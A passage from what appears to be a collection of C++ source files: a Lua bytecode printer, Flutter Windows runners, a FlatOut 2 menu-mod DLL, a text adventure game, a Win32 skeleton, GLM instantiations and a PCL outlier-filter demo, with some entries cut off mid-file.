(int)proto.MaxStackSize << std::endl;\n\n    std::cout << indent << \"    -- Constants --\" << std::endl;\n    for (const auto& constant : proto.Constants) {\n        std::string type;\n        std::string value;\n\n        if (constant.type == Deserializer::Constant::Type::Nil) {\n            type = \"Nil\";\n            value = \"nil\";\n        }\n        else if (constant.type == Deserializer::Constant::Type::Boolean) {\n            type = \"Boolean\";\n            value = std::get<bool>(constant.value) ? \"true\" : \"false\";\n        }\n        else if (constant.type == Deserializer::Constant::Type::Number) {\n            type = \"Number\";\n            if (constant.value.index() == 2) {\n                value = std::to_string(std::get<int>(constant.value));\n            }\n            else if (constant.value.index() == 3) { \n                value = std::to_string(std::get<double>(constant.value));\n            }\n        }\n        else if (constant.type == Deserializer::Constant::Type::String) {\n            type = \"String\";\n            value = '\"' + std::get<std::string>(constant.value) + '\"';\n        }\n\n        std::cout << indent << \"    [Constant] Type = \" << type << \", Value = \" << value << std::endl;\n    }\n\n    std::cout << indent << \"    -- Instructions --\" << std::endl;\n    for (const auto& instr : proto.Instructions) {\n        std::cout << indent << \"    Opcode: \" << instr.Opcode\n            << \", A: \" << instr.RegA\n            << \", B: \" << std::visit([](auto&& arg) { return std::to_string(arg); }, instr.RegB)\n            << \", C: \" << std::visit([](auto&& arg) { return std::to_string(arg); }, instr.RegC)\n            << \", Mnemonic: \" << instr.Mnemonic << std::endl;\n    }\n\n    if (!proto.Prototypes.empty()) {\n        std::cout << indent << \"    -- Nested Prototypes --\" << std::endl;\n        for (size_t i = 0; i < proto.Prototypes.size(); ++i) {\n            std::stringstream nestedFuncName;\n            nestedFuncName << \"proto_\" << &proto.Prototypes[i];\n            PrintPrototype(proto.Prototypes[i], level + 1, nestedFuncName.str());\n        }\n    }\n\n    std::cout << indent << \"end\" << std::endl;\n}\n\nvoid PrintAll(const Deserializer::Header& header, const Deserializer::Prototype& proto) {\n    PrintHeader(header);\n    PrintPrototype(proto, 0, \"main\");\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_riv\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"lifecycle\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <windows.h>\n#include <d3d9.h>\n\n#include \"nya_dx9_hookbase.h\"\n#include \"nya_commonmath.h\"\n#include \"nya_commonhooklib.h\"\n\n#include \"fo2.h\"\n#include \"../nya-common-fouc/fo2versioncheck.h\"\n#include \"chloemenulib.h\"\n\nvoid HookLoop() {}\n\nbool bDeviceJustReset = false;\n\nnamespace MenuStyleDefault {\n\tbool DrawMenuOption(const ChloeMenuLib::tMenuStyleState* state, const ChloeMenuLib::tMenuOptionDraw& opt) {\n\t\tif (opt.y >= 0 && opt.y <= state->menuYSize && opt.level == state->menuLevel) {\n\t\t\ttNyaStringData data;\n\t\t\tdata.x = state->posX;\n\t\t\tdata.y = state->posY;\n\t\t\tdata.size = 0.03;\n\t\t\tdata.y += data.size * opt.y;\n\t\t\tdata.XCenterAlign = true;\n\t\t\tif (opt.isHighlighted) {\n\t\t\t\tdata.SetColor(241, 193, 45, 255);\n\t\t\t}\n\t\t\telse if (opt.nonSelectable) {\n\t\t\t\tdata.SetColor(255, 255, 255, 255);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tdata.SetColor(127, 127, 127, 255);\n\t\t\t}\n\t\t\tDrawStringFO2(data, opt.label);\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n\n\tvoid Draw(ChloeMenuLib::tMenuStyleState* state) {\n\t\tif (!g_pd3dDevice) {\n\t\t\tChloeMenuLib::UpdateD3DProperties(state);\n\t\t\tInitHookBase();\n\t\t}\n\t\tif (bDeviceJustReset) {\n\t\t\tImGui_ImplDX9_CreateDeviceObjects();\n\t\t\tbDeviceJustReset = false;\n\t\t}\n\t\tChloeMenuLib::SetMenuYSize(16);\n\n\t\tint numMenuOptionsDrawn = 0;\n\t\tfor (int i = 0; i < state->numMenuOptions; i++) {\n\t\t\tauto& opt = state->menuOptions[i];\n\t\t\tif (opt.level == state->menuLevel) numMenuOptionsDrawn++;\n\t\t\tDrawMenuOption(state, opt);\n\t\t}\n\n\t\tif (state->menuScroll > 0) {\n\t\t\ttNyaStringData data;\n\t\t\tdata.x = state->posX;\n\t\t\tdata.y = state->posY;\n\t\t\tdata.size = 0.03;\n\t\t\tdata.y += data.size * -1;\n\t\t\tdata.XCenterAlign = true;\n\t\t\tDrawStringFO2(data, \"...\");\n\t\t}\n\t\tif ((numMenuOptionsDrawn - state->menuScroll) > state->menuYSize + 1) {\n\t\t\ttNyaStringData data;\n\t\t\tdata.x = state->posX;\n\t\t\tdata.y = state->posY;\n\t\t\tdata.size = 0.03;\n\t\t\tdata.y += data.size * (state->menuYSize + 1);\n\t\t\tdata.XCenterAlign = true;\n\t\t\tDrawStringFO2(data, \"...\");\n\t\t}\n\n\t\t// menu title\n\t\t{\n\t\t\ttNyaStringData data;\n\t\t\tdata.x = state->posX;\n\t\t\tdata.y = state->posY;\n\t\t\tdata.size = 0.03;\n\t\t\tdata.y += data.size * -2;\n\t\t\tdata.XCenterAlign = true;\n\t\t\tDrawStringFO2(data, state->firstSubmenuName && state->firstSubmenuName[0] ? state->firstSubmenuName : state->libVersion);\n\t\t}\n\n\t\t// menu prompts\n\t\t{\n\t\t\ttNyaStringData data;\n\t\t\tdata.x = state->posX;\n\t\t\tdata.y = state->posY;\n\t\t\tdata.size = 0.03;\n\t\t\tint max = numMenuOptionsDrawn;\n\t\t\tif (max > state->menuYSize + 1) max = state->menuYSize + 1;\n\t\t\tdata.y += data.size * (max + 1);\n\t\t\tdata.XCenterAlign = true;\n\t\t\tstd::string str;\n\t\t\tif (state->backHint && state->backHint[0]) {\n\t\t\t\tstr += \"[ESC] \" + (std::string)state->backHint;\n\t\t\t}\n\t\t\tif (state->lrHint && state->lrHint[0]) {\n\t\t\t\tif (!str.empty()) str += \" \";\n\t\t\t\tstr += \"[LEFT/RIGHT] \" + (std::string)state->lrHint;\n\t\t\t}\n\t\t\tif (state->enterHint && state->enterHint[0]) {\n\t\t\t\tif (!str.empty()) str += \" \";\n\t\t\t\tstr += \"[ENTER] \" + (std::string)state->enterHint;\n\t\t\t}\n\t\t\tDrawStringFO2(data, str);\n\t\t}\n\t}\n};\n\nvoid OnD3DReset() {\n\tif (g_pd3dDevice) {\n\t\tImGui_ImplDX9_InvalidateDeviceObjects();\n\t\tbDeviceJustReset = true;\n\t}\n}\n\nBOOL WINAPI DllMain(HINSTANCE, DWORD fdwReason, LPVOID) {\n\tswitch( fdwReason ) {\n\t\tcase DLL_PROCESS_ATTACH: {\n\t\t\tDoFlatOutVersionCheck(FO2Version::FO2_1_2);\n\t\t\tChloeMenuLib::RegisterMenuStyle(\"Default\", MenuStyleDefault::Draw);\n\t\t\tChloeMenuLib::RegisterD3DReset(OnD3DReset);\n\t\t} break;\n\t\tdefault:\n\t\t\tbreak;\n\t}\n\treturn TRUE;\n}",
    "#include<iostream>\n#include<string>\n#include <iomanip>\n#include<cstdlib>\n#include<ctime>\n\nusing namespace std;\n\n// Function to display the introduction\nvoid intro () {\n    cout <<\"Welcome to Test Adventure Game 2.0\" << endl;\n\n    cout<<\"|\uffe3\uffe3\uffe3\uffe3\uffe3\uffe3\uffe3|\" <<endl ;\n    cout<<\"|   Welcome    |\" <<endl ;\n    cout<<\"|  To My Game  |\" <<endl ;\n    cout<<\"|______________|\" <<endl ;\n    cout<<\"(\\\\__/) ||\" <<endl;\n    cout<<\"(^_-)   ||\" <<endl;\n    cout<<\"/   \u3065   ||\" <<endl ;\n    cout<<\"z(_(\\\")(\\\") ||\" <<endl;\n\n    cout <<\"This game depends on the choices you make.\" << endl;\n    cout <<\"Good Luck!!\" << endl;\n}\n\n// Function to handle game over logic\nvoid gameOver (bool & playAgain) {\n    cout <<\"Game Over! Do you want to try again? \\n y : Yes \\n n : No\" << endl;\n\n    char choice;\n    cin >> choice;\n\n    // Validate the user's input\n    while(true) {\n        if(choice == 'y' ) {\n            playAgain = true;\n            break;\n        } else if (choice == 'n' ) {\n            cout <<\"Thanks for playing!\" << endl;\n            playAgain = false;\n            break;\n        } else {\n            cout <<\"Invalid input. Please try again and choose between (y / n).\" << endl;\n            cin >> choice; // Correct input must be taken again\n        }\n    }\n}\n\n// Function to display the player's inventory\nvoid displayInventory(string inventory[], int inventoryCount) {\n    if(inventoryCount == 0) {\n        cout<<\"Your inventory is empty.\" << endl;\n    } else {\n        cout <<\"Inventory: \" << inventoryCount << \" items\" << endl;\n        for(int i = 0 ; i < inventoryCount ; i++) {\n            cout << inventory[i] << endl;\n        }\n    }\n}\n\n// Function to start the game\nvoid startGame(bool &playAgain, bool &hasSword, bool &hasPotion, bool &hasArmor, bool &hasGem) {\n    int health = 100; // Player's initial health\n    const int max_Inventory = 5; // Maximum number of items in inventory\n    int inventoryCount = 0; // Current count of inventory items\n    string inventory[max_Inventory]; // Array to store inventory items\n    srand(time(0)); // Seed the random number generator\n\n    intro(); // Display the introduction\n\n    cout << \"You're standing in front of an eerie forest. You decide to \\n \ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32\ud83c\udf32 \\n1 : Enter the forest \\n2 : Look around the forest \\n3 : Stay where you are \\n4 : Go back home\" << endl;\n    \n    int choose;\n    cin >> choose;\n\n    while (true) {\n        if (choose == 1) {\n            cout << \"You enter the eerie-looking forest. Suddenly you feel a bit cold, and as soon as you react, a beast attacks you.\" << endl;\n            \n            cout<<\" ()\" <<endl ;\n            cout<<\"(.       )\" <<endl ;\n            cout <<\"((((((()))))\"<<endl;\n            cout<<\"|  o    o  |\"<<endl ;\n            cout<<\" (.          ) \"<<endl;\n            cout <<\" (    '  _ ' )\" <<endl ;\n            cout <<\"/\\\\      / \\\\\"<<endl ;\n            cout<<\" (_\\\\___/_)\" <<endl ;\n            cout <<\" /       \\\\\" <<endl ;\n                   \n            cout << \"Do you want to: \\n1 : Run \\n2 : Check your inventory\" << endl;\n\n            int Do;\n            cin >> Do;\n\n            if (Do == 1) {\n                cout << \"As soon as you saw the beast, you ran away but got injured.\" << endl;\n                health -= rand() % 81 + 20; // Reduce health randomly between 20 and 100\n                cout << \"Health: \" << health << endl;\n\n            } else if (Do == 2) {\n                if (hasSword) {\n                    cout << \"You parried the beast's attack and injured it heavily. The beast ran away.\" << endl;\n                    cout << \"Do you want to look around and search the beast's lair?  \\n3 : Yes \\n4 : No\" << endl;\n\n                    int look;\n                    cin >> look;\n\n                    if (look == 3) {\n                        cout << \"You go into the beast's lair and find a potion.\" << endl;\n                        displayInventory(inventory, inventoryCount);\n                        if (inventoryCount < max_Inventory) {\n                            inventory[inventoryCount++] = \"Potion\"; // Add potion to inventory\n                            cout << \"\\\" \"<<inventoryCount <<\" \\\" :\"  << \"Potion added to your inventory.\" << endl;\n                            hasPotion = true;\n\n                            cout << \"Do you want to continue exploring the eerie forest? \\n1 : Yes  \\n2 : No\" << endl;\n\n                            int exploring;\n                            cin >> exploring;\n\n                            if (exploring == 1) {\n                                cout << \"You continue venturing deeper into the forest. The sound of water splashing catches your attention. Curious, you follow the noise and discover a beautiful riverbank. \\n \ud83c\udf0a \ud83c\udf0a \ud83c\udf0a \ud83c\udf0a \ud83c\udf0a\ud83c\udf0a\ud83c\udf0a\ud83c\udf0a\ud83c\udf0a\ud83c\udf0a\ud83c\udf0a \\nAs you explore further, you stumble upon a suit of armor.\" << endl;\n                                if (inventoryCount < max_Inventory) {\n                                    inventory[inventoryCount++] = \"Armor\"; // Add armor to inventory\n                                    cout << \"\\\" \"<<inve",
    "#undef UNICODE  // Unicode\u3067\u306f\u306a\u304f\u3001\u30de\u30eb\u30c1\u30d0\u30a4\u30c8\u6587\u5b57\u3092\u4f7f\u3046\r\n\r\n#include <Windows.h>\r\n\r\n// \u30de\u30af\u30ed\u5b9a\u7fa9\r\n#define CLASS_NAME    \"DX21Smpl\"// \u30a6\u30a4\u30f3\u30c9\u30a6\u30af\u30e9\u30b9\u306e\u540d\u524d\r\n#define WINDOW_NAME  \"\u30b9\u30b1\u30eb\u30c8\u30f3\u30d7\u30ed\u30b0\u30e9\u30e0\"// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u540d\u524d\r\n\r\n#define SCREEN_WIDTH (640)\t// \u30a6\u30a4\u30f3\u30c9\u30a6\u306e\u5e45\r\n#define SCREEN_HEIGHT (480)\t// \u30a6\u30a4\u30f3\u30c9\u30a6\u306e\u9ad8\u3055\r\n\r\n// \u95a2\u6570\u306e\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u5ba3\u8a00\r\nLRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);\r\n\r\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,\r\n\tLPSTR lpCmdLine, int nCmdShow)\r\n{\r\n\tWNDCLASSEX wc;\r\n\r\n\twc.cbSize = sizeof(WNDCLASSEX);\r\n\twc.style = CS_CLASSDC;\r\n\twc.lpfnWndProc = WndProc;\r\n\twc.cbClsExtra = 0;\r\n\twc.cbWndExtra = 0;\r\n\twc.hInstance = hInstance;\r\n\twc.hIcon = NULL;\r\n\twc.hCursor = LoadCursor(NULL, IDC_ARROW);\r\n\twc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);\r\n\twc.lpszMenuName = NULL;\r\n\twc.lpszClassName = CLASS_NAME;\r\n\twc.hIconSm = NULL;\r\n\r\n\tRegisterClassEx(&wc);\r\n\r\n\tHWND hWnd;\r\n\thWnd = CreateWindowEx(0,// \u62e1\u5f35\u30a6\u30a3\u30f3\u30c9\u30a6\u30b9\u30bf\u30a4\u30eb\r\n\t\tCLASS_NAME,// \u30a6\u30a3\u30f3\u30c9\u30a6\u30af\u30e9\u30b9\u306e\u540d\u524d\r\n\t\tWINDOW_NAME,// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u540d\u524d\r\n\t\tWS_OVERLAPPEDWINDOW,// \u30a6\u30a3\u30f3\u30c9\u30a6\u30b9\u30bf\u30a4\u30eb\r\n\t\tCW_USEDEFAULT,// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u5de6\u4e0a\uff38\u5ea7\u6a19\r\n\t\tCW_USEDEFAULT,// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u5de6\u4e0a\uff39\u5ea7\u6a19 \r\n\t\tSCREEN_WIDTH,// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u5e45\r\n\t\tSCREEN_HEIGHT,// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u9ad8\u3055\r\n\t\tNULL,// \u89aa\u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u30cf\u30f3\u30c9\u30eb\r\n\t\tNULL,// \u30e1\u30cb\u30e5\u30fc\u30cf\u30f3\u30c9\u30eb\u307e\u305f\u306f\u5b50\u30a6\u30a3\u30f3\u30c9\u30a6ID\r\n\t\thInstance,// \u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u30cf\u30f3\u30c9\u30eb\r\n\t\tNULL);// \u30a6\u30a3\u30f3\u30c9\u30a6\u4f5c\u6210\u30c7\u30fc\u30bf\r\n\r\n\t// \u6307\u5b9a\u3055\u308c\u305f\u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u8868\u793a\u72b6\u614b\u3092\u8a2d\u5b9a(\u30a6\u30a3\u30f3\u30c9\u30a6\u3092\u8868\u793a)\r\n\tShowWindow(hWnd, nCmdShow);\r\n\t// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u72b6\u614b\u3092\u76f4\u3061\u306b\u53cd\u6620(\u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u9818\u57df\u3092\u66f4\u65b0)\r\n\tUpdateWindow(hWnd);\r\n\r\n\tMSG msg;\r\n\r\n\tfor (;;) {\r\n\t\tBOOL isAnyMessage = PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);\r\n\r\n\t\tif (isAnyMessage)\r\n\t\t{\r\n\t\t\tDispatchMessage(&msg);\r\n\r\n\t\t\tif (msg.message == WM_QUIT) {\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tUnregisterClass(CLASS_NAME, hInstance);\r\n\r\n\treturn (int)msg.wParam;\r\n}\r\n\r\n\r\nLRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tswitch (uMsg)\r\n\t{\r\n\tcase WM_DESTROY:// \u30a6\u30a3\u30f3\u30c9\u30a6\u7834\u68c4\u306e\u30e1\u30c3\u30bb\u30fc\u30b8\r\n\t\tPostQuitMessage(0);// \u201cWM_QUIT\u201d\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u9001\u308b\u3000\u2192\u3000\u30a2\u30d7\u30ea\u7d42\u4e86\r\n\t\tbreak;\r\n\r\n\tcase WM_CLOSE:  // x\u30dc\u30bf\u30f3\u304c\u62bc\u3055\u308c\u305f\u3089\r\n\t\tDestroyWindow(hWnd);  // \u201cWM_DESTROY\u201d\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u9001\u308b\r\n\t\tbreak;\r\n\r\n\tdefault:\r\n\t\t// \u4e0a\u306ecase\u4ee5\u5916\u306e\u5834\u5408\u306e\u51e6\u7406\u3092\u5b9f\u884c\r\n\t\treturn DefWindowProc(hWnd, uMsg, wParam, lParam);\r\n\t\tbreak;\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include <iostream>\n#include <pcl/io/ply_io.h>\n#include <pcl/point_types.h>\n#include <pcl/filters/statistical_outlier_removal.h>\n#include <pcl/visualization/pcl_visualizer.h>\n\ntypedef pcl::PointXYZ PointT;\ntypedef pcl::PointCloud<PointT> PointCloudT;\n\nint main(int argc, char* argv[])\n{\n  PointCloudT::Ptr cloud(new PointCloudT);\n  PointCloudT::Ptr cloud_filtered(new PointCloudT);\n\n  if(argc < 2)\n     {\n         PCL_ERROR(\"The file.ply is missing : Provide one ply file.\\n!\");\n         return(-1);\n     }\n\n\n  if (pcl::io::loadPLYFile(argv[1], *cloud) < 0)\n  {\n    PCL_ERROR(\"Error loading cloud %s.\\n\", argv[1]);\n    return(-1);\n  }\n  std::cerr << \"Cloud before filtering: \" << std::endl;\n  std::cerr << *cloud << std::endl;\n\n  // Create the filtering object\n  pcl::StatisticalOutlierRemoval<PointT> sor;\n  sor.setInputCloud(cloud);\n  //The number of neighbors to analyze for each point is set to 50\n  sor.setMeanK(50);\n  //Points who have a distance larger than 1 standard deviation of the mean distance to the point will be removed\n  sor.setStddevMulThresh(1.0);\n\n  sor.filter(*cloud_filtered);\n  std::cerr << \"Cloud after filtering: \" << std::endl;\n  std::cerr << *cloud_filtered << std::endl;\n\n/*\n  pcl::PCDWriter writer;\n  writer.write<pcl::PointXYZ> (\"table_scene_lms400_inliers.pcd\", *cloud_filtered, false);\n*/\n  // Visualization\n  pcl::visualization::PCLVisualizer viewer(\"Outlier Removal demo\");\n\n\n  // The color we will be using\n  float bckgr_gray_level = 0.0;  // Black\n  float txt_gray_lvl = 1.0 - bckgr_gray_level;\n\n // Visualization\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_in_color_h1( cloud_filtered, (int)255*txt_gray_lvl,\n                                            (int)255*txt_gray_lvl, (int)255*txt_gray_lvl);\n  viewer.addPointCloud(cloud_filtered, cloud_in_color_h1, \"Points Clouds 1\");\n\n\n  sor.setNegative (true);\n  sor.filter (*cloud_filtered);\n/*\n  writer.write<pcl::PointXYZ> (\"table_scene_lms400_outliers.pcd\", *cloud_filtered, false);\n*/\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_in_color_h2( cloud_filtered, (int)255*txt_gray_lvl,\n                                            (int)0, (int)0);\n  viewer.addPointCloud(cloud_filtered, cloud_in_color_h2, \"Points Clouds 2\");\n\n  // Set the point size\n  viewer.setPointCloudRenderingProperties(\n      pcl::visualization::PCL_VISUALIZER_POINT_SIZE,\n      3, // Point size\n      \"Points Clouds 2\"\n  );\n  // Set background color\n  viewer.setBackgroundColor(bckgr_gray_level, bckgr_gray_level, bckgr_gray_level);\n\n  // Set camera position and orientation\n  viewer.setCameraPosition(-3.68332, 2.94092, 5.71266, 0.289847, 0.921947, -0.256907, 0);\n  viewer.setSize(1280, 1024);  // Visualiser window size\n\n  while(!viewer.wasStopped())\n    {\n      viewer.spinOnce();\n    }\n  return (0);\n\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"remote_control_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    